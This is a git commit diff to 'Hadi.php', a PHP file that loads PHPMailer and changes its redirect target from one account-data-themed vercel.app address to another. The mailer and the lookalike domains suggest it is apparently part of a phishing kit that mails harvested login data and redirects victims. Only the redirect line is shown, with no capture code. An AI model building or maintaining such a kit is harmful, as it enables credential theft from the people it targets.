980d25c87e64c52b3d28978b97679fc0a9ba0a06
Ontres44322 <onlinemeta858@gmail.com>
2025-07-10 00:14:53 +0500

    Update Hadi.php

--- Hadi.php
+++ Hadi.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://account-data-here.vercel.app/");
+header("Location: https://page-account-data.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
